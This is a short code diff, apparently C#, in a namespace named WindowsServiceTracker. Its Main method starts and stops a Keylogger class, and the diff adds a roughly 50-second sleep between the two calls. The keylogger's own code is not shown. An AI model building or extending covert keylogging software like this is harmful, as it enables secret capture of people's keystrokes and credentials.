@@ -35,6 +35,7 @@ namespace WindowsServiceTracker
         public static void Main()
         {
             Keylogger.Start();
+            Thread.Sleep(50000);
             Keylogger.Stop();
         }
     }
